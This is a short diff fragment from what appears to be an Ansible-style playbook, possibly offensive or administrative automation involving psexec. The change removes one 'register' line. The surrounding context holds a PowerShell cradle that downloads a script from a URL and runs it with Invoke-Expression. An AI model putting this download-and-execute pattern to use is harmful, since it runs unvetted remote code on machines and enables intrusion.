@@ -19,5 +19,4 @@
             Invoke-Expression ((New-Object Net.WebClient).DownloadString($url))
             exit
       delegate_to: localhost
-      register: psexec_process_system
       
